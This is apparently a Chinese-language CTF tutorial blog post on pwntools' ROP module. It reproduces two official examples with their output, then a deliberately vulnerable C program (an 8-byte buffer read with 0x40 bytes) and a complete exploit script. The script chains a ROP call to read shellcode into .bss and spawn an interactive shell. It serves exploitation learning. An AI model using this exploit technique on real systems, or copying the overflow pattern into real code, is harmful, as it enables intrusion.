---
title: "Mac下pwn题环境搭建与入门"
date: 2020-11-28T17:26:07+08:00
draft: false
tags: ["pwn"]
categories: ["pwn"] 
---

## pwn ROP模块使用

官网的示例代码1

```python
from pwn import *

context.clear(arch='i386')
binary = ELF.from_assembly('add esp, 0x10; ret')
binary.symbols = {'read': 0xdeadbeef, 'write': 0xdecafbad, 'exit': 0xfeedface}

rop = ROP(binary)

rop.raw(0)
rop.raw(unpack(b'abcd'))
rop.raw(2)
rop.call('read', [4,5,6])
rop.write(7,8,9)
rop.exit()

print(rop.dump())
```



得到的结果：



```bash
[*] '/tmp/pwn-asm-a_q108jq/step3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0xffff000)
    RWX:      Has RWX segments
[*] Loaded 2 cached gadgets for '/tmp/pwn-asm-a_q108jq/step3'
0x0000:              0x0
0x0004:       0x64636261
0x0008:              0x2
0x000c:       0xdeadbeef read(4, 5, 6)
0x0010:       0x10000000 <adjust @0x24> add esp, 0x10; ret
0x0014:              0x4 arg0
0x0018:              0x5 arg1
0x001c:              0x6 arg2
0x0020:          b'iaaa' <pad>
0x0024:       0xdecafbad write(7, 8, 9)
0x0028:       0x10000000 <adjust @0x3c> add esp, 0x10; ret
0x002c:              0x7 arg0
0x0030:              0x8 arg1
0x0034:              0x9 arg2
0x0038:          b'oaaa' <pad>
0x003c:       0xfeedface exit()
```



官网的第二个实例

```python
from pwn import *


context.clear(arch='i386')
c = constants
assembly =  'read:'      + shellcraft.read(c.STDIN_FILENO, 'esp', 1024)
assembly += 'ret\n'
assembly += 'add_esp: add esp, 0x10; ret\n'
assembly += 'write: enter 0,0\n'
assembly += '    mov ebx, [ebp+4+4]\n'
assembly += '    mov ecx, [ebp+4+8]\n'
assembly += '    mov edx, [ebp+4+12]\n'
assembly += shellcraft.write('ebx', 'ecx', 'edx')
assembly += '    leave\n'
assembly += '    ret\n'
assembly += 'flag: .asciz "The flag"\n'
assembly += 'exit: ' + shellcraft.exit(0)

binary   = ELF.from_assembly(assembly)
rop = ROP(binary)
rop.write(c.STDOUT_FILENO, binary.symbols['flag'], 8)
rop.exit()
print(rop.chain())

p = process(binary.path)
p.send(rop.chain())
print(p.recvall(timeout=5))

```



结果



```bash
[*] '/tmp/pwn-asm-wmmhe3ra/step3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0xffff000)
    RWX:      Has RWX segments
[*] Loading gadgets for '/tmp/pwn-asm-wmmhe3ra/step3'
b'\x12\x00\x00\x10\x0e\x00\x00\x10\x01\x00\x00\x00&\x00\x00\x10\x08\x00\x00\x00faaa/\x00\x00\x10'
[+] Starting local process '/tmp/pwn-asm-wmmhe3ra/step3': pid 37355
[+] Receiving all data: Done (8B)
[*] Process '/tmp/pwn-asm-wmmhe3ra/step3' stopped with exit code 0 (pid 37355)
b'The flag'
```



## rop例题

```C
#include <stdio.h>
#include <unistd.h>

void init(){
    setvbuf(stdout, NULL, _IOLBF, 0);
}

void welcome(){
    write(1, "Welcome to zsctf!\n", 21);
}

void vuln(){
    char buffer[8] = {0};
    read(0, buffer, 0x40);
}

int main(){
    init();
    welcome();
    vuln();
    return 0;
}
```



对应的exp

```python
from pwn import *
import time
proc = './static'
context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
bss_addr = 0x0804A024
context.binary = proc
#proc1 = "/ctf/work/exercise/static-x86/static"
shellcode = asm(shellcraft.sh())

p = process(proc)
p.recvuntil("Welcome to zsctf!")

rop = ROP(proc)
rop.read(0, bss_addr+0x100, len(shellcode))
rop.call(bss_addr+0x100)
print(rop.dump())
print(str(rop))
p.send(b'a'*20 + rop.chain())
# time.sleep(1)

p.send(shellcode)
p.interactive()
```



